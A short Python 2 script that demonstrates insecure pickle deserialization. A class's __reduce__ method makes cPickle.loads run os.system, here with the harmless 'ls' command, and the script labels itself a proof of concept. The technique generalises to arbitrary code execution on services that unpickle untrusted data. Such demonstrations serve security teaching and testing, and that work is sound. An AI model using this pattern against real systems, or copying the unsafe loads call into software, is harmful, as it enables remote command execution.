import os
import cPickle


# Exploit that we want the target to unpickle
class Exploit(object):
    def __reduce__(self):
        # Note: this will only list files in your directory.
        # It is a proof of concept.
        return (os.system, ('ls',))


def serialize_exploit():
    shellcode = cPickle.dumps(Exploit())
    return shellcode


def insecure_deserialize(exploit_code):
    cPickle.loads(exploit_code)


if __name__ == '__main__':
    shellcode = serialize_exploit()
    print('Obtaining files...')
    insecure_deserialize(shellcode)